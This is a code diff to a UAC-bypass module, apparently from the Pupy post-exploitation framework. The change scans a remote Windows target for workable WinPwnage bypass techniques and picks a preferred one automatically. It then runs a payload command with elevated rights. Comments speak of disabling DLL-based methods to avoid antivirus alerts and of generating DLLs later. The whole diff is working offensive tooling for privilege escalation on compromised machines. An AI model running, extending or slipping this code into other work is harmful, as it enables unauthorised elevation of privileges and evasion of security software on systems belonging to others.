@@ -32,43 +32,61 @@ class BypassUAC(PupyModule):
         cls.arg_parser.add_argument('-m', dest='method', help="Should be an ID, get the list "
                                                               "scanning which methods are possible (-l)")
 
-    def print_result(self, result):
+    def parse_result(self, result, print_result=True, get_method_id=True):
+        """
+        Parse result returned by WinPwnage
+        Return the best method id if possible
+        """
+        func = {'t': self.log, 'ok': self.success, 'error': self.error, 'info': self.info, 'warning': self.warning}
+        preferred_method = ('01', '02', '03', '04', '08', '09', '10')
+        method_id = []
         for tag, message in result:
-            if tag == 't':
-                self.log(message)
-            elif tag == 'ok':
-                self.success(message)
-            elif tag == 'error':
-                self.error(message)
-            elif tag == 'info':
-                self.info(message)
-            elif tag == 'warning':
-                self.warning(message)
+            if tag in func:
+                if print_result:
+                    func[tag](message)
+                if tag == 'ok' and get_method_id:
+                    method_id.append(message.split()[0])
+
+        if get_method_id:
+            for p in preferred_method:
+                if p in method_id:
+                    return p
+
+    def launch_scan(self, print_result=True):
+        """
+        Check all possible methods found on the target to bypass uac
+        """
+        scanner = self.client.remote('winpwnage.core.scanner', 'scanner', False)
+        result = scanner(uac=True, persist=False).start()
+        return self.parse_result(result, print_result)
 
     def run(self, args):
-        if not args.scan and not args.method:
-            self.error('Get the list of possible methods (-l) and bypass uac using -m <id>')
-            return
-
-        if args.scan:
-            scanner = self.client.remote('winpwnage.core.scanner', 'scanner', False)
-            result = scanner(uac=True, persist=False).start()
-            self.print_result(result)
-            return
 
         # Check if a UAC bypass can be done
         if not self.client.conn.modules["pupwinutils.security"].can_get_admin_access():
             self.error('Your are not on the local administrator group.')
             return
 
+        if args.scan:
+            self.launch_scan()
+            return
+
+        if not args.scan and not args.method:
+            method = self.launch_scan(print_result=False)
+            if not method:
+                self.error('Get the list of possible methods (-l) and bypass uac using -m <id>')
+                return
+        else:
+            method = args.method
+
         # TO CHANGE:
-        # A way should be found to automatically obfuscate a dll (using custom dll stored on config file)
-        if args.method in ('11', '12', '13', '14'):
+        # A way should be found to automatically generate a dll (ex: using a generic dll which launch a bat script)
+        if method in ('11', '12', '13', '14'):
             self.warning('This technique needs to upload a dll. It has been temporary disabled to avoid AV alerts')
             return
 
         # Weird error, root cause not found yet
-        if args.method in '07':
+        if method in '07':
             self.warning('This technique does not work with custom exe, only work with cmd.exe')
             return
 
@@ -160,11 +178,11 @@ class BypassUAC(PupyModule):
 
         self.info("Bypass uac could take few seconds, be patient...")
         bypass_uac = self.client.remote('winpwnage.core.scanner', 'function', False)
-        result = bypass_uac(uac=True, persist=False).run(id=args.method, payload=cmd)
+        result = bypass_uac(uac=True, persist=False).run(id=method, payload=cmd)
         if not result:
             self.error('Nothing done, check if the id is on the list')
         else:
-            self.print_result(result)
+            self.parse_result(result, get_method_id=False)
 
         # Powershell could be longer to execute
         if not args.exe and not args.restart:
